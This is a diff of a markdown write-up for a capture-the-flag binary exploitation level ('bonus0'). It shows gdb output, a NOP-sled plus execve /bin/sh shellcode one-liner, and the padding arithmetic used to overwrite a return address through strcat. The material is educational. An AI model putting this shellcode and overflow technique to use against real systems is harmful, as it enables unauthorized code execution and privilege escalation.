@@ -28,6 +28,7 @@ Replace '\n' by '\0', and if there's no '\n' ?
 
 **Tests :**
 If we respect the size of the inputs (20)
+
 ``./bonus0``
 > -
 
@@ -67,8 +68,7 @@ read([**file descriptor**], [**buffer pointer**], [**size max to read**])
 
 ``(gdb) run``
 >Starting program: /home/user/bonus0/bonus0
- -
-Breakpoint 1, 0x080484d6 in p ()
+>Breakpoint 1, 0x080484d6 in p ()
 
 ``(gdb) i r``
 >eax            0xbfffe670	-1073748368
@@ -84,19 +84,28 @@ The same shellcode as level 2 is used : https://shell-storm.org/shellcode/files/
 
 
 **1st input :**
+
 NOP * 1000 (slide for shellcode) + SHELLCODE
 python -c "print '\x90' * 1000 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'"
 
 **2nd input**
+
 Analyzing the behavior of memory :
-input1 -> **20 bytes**
-input2 -> **20 bytes**
-Both are concatenated into a buffer of **54 bytes**
-20 + 20 + 1 ('/0' added by strcat) = **41 bytes filled out of 54.**
-We add **9 filling chars to reach 50**.
-We **add the address we want to point to** (somewhere in the middle of the NOPs that serve as a slide to our shellcode).
+
+- input1 -> **20 bytes**
+
+- input2 -> **20 bytes**
+
+- Both are concatenated into a buffer of **54 bytes**
+
+- 20 + 20 + 1 ('/0' added by strcat) = **41 bytes filled out of 54.**
+
+- We add **9 filling chars to reach 50**.
+
+- We **add the address we want to point to** (somewhere in the middle of the NOPs that serve as a slide to our shellcode).
 -> Address in the middle of the NOPs (buffer start 0xbfffe670 -> 500 bytes further): **0xbfffe864**
-We fill the rest of our buffer, with **7 filling characters, to correctly override the return address**
+
+- We fill the rest of our buffer, with **7 filling characters, to correctly override the return address**
 
 ----
 
